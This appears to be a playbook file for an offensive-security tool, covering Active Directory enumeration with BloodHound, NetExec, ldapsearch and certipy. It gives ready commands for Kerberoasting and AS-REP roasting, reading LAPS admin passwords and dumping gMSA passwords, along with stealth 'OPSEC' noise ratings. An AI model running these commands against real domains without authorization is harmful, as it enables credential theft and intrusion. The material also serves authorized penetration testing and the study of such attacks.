# Active Directory Discovery

tags: active-directory, ldap, kerberos, bloodhound, bloodhound-python, sharphound, collector, ad, domain, domain-enum, enumeration, users, groups, trusts, delegation, laps, gmsa, nxc, netexec

## Objective
Enumerate the Active Directory domain structure: users, groups, computers, trusts, GPOs, ACLs. BloodHound collection is the single most impactful enumeration step.

## Prerequisites
- Valid domain credential (any privilege level)
- Network access to a domain controller (ports 389/636, 88)

## Methodology

### BloodHound Collection
```bash
# BloodHound Python ingestor (OPSEC: 0.5 — LDAP + SMB queries)
bloodhound-python -c All -d domain.com -u user -p 'pass' -dc dc01.domain.com --zip
# Collection methods: All, DCOnly (0.3 — no host contact), Group, LocalAdmin,
#                     Session, Trusts, ACL, ObjectProps

# Use DCOnly for stealth — no host contact, LDAP-only (OPSEC: 0.3)
bloodhound-python -c DCOnly -d domain.com -u user -p 'pass' -dc dc01.domain.com --zip
```
Ingest results via `ingest_bloodhound` tool or parse manually.

### NetExec Comprehensive Enumeration
```bash
# Users, groups, shares, password policy
nxc smb DC -u user -p pass --users --groups --shares --pass-pol

# LDAP-based enumeration
nxc ldap DC -u user -p pass --trusted-for-delegation --admin-count
nxc ldap DC -u user -p pass --kerberoasting kerb.txt --asreproast asrep.txt
nxc ldap DC -u user -p pass -M laps -M adcs -M maq
```

### LDAP User Enumeration
```bash
# Detailed user enumeration
ldapsearch -x -H ldap://DC -b "DC=dom,DC=com" "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName userAccountControl memberOf description servicePrincipalName
```

### Trust Enumeration
```bash
nltest /domain_trusts /all_trusts

# LDAP trust enumeration
ldapsearch -x -H ldap://DC -b "CN=System,DC=dom,DC=com" \
  "(objectClass=trustedDomain)" trustPartner trustDirection trustType
```

### LAPS Password Reading
```bash
# LAPS — read local admin passwords if permitted (OPSEC: 0.2)
nxc ldap DC -u user -p pass -M laps

# Manual LDAP query
ldapsearch -x -H ldap://DC -D 'user@dom.com' -w pass \
  -b "DC=dom,DC=com" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd
```

### gMSA Password Extraction
```bash
# gMSA password extraction (OPSEC: 0.2)
nxc ldap DC -u user -p pass --gmsa
gMSADumper.py -u user -p pass -d domain.com
```

### Delegation Enumeration
```bash
# Find delegation configurations
impacket-findDelegation DOMAIN/user:pass -dc-ip DC
```
- **Unconstrained delegation**: high-value targets for TGT capture
- **Constrained delegation**: specific service abuse paths
- **RBCD**: check msDS-AllowedToActOnBehalfOfOtherIdentity

### ADCS Enumeration
```bash
certipy find -u 'user@dom.com' -p 'pass' -dc-ip DC -vulnerable -stdout
```

## Graph Reporting
Creates ALL node types — `user`, `group`, `host`, `gpo`, `ou`, `domain` with full edges:
- **MEMBER_OF edges**: users/groups → groups
- **MEMBER_OF_DOMAIN edges**: entities → domain
- **ADMIN_TO edges**: where group membership grants local admin
- **HAS_SESSION edges**: active logon sessions
- **DELEGATES_TO edges**: delegation configurations
- **TRUSTS edges**: between domain nodes with direction and type
- **Certificate nodes**: with template properties and ESC flags
- **User nodes**: with privileged flag, enabled status, SID, adminCount
- **Credential nodes**: from LAPS/gMSA password reads

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| LDAP queries | 0.3 |
| BloodHound -c All | 0.5 |
| BloodHound -c DCOnly | 0.3 |
| nxc user/group enum | 0.3 |
| LAPS read | 0.2 |
| gMSA read | 0.2 |

**Detection**: High-volume LDAP queries, BloodHound user-agent, SMB connections to many hosts (session collection).

## Sequencing
- **After**: Network Recon, SMB Enumeration
- **Critical prerequisite** for all AD attack skills
- **Feeds →**: Kerberos Attacks, ADCS Exploitation, AD Privilege Escalation, NTLM Relay, Lateral Movement
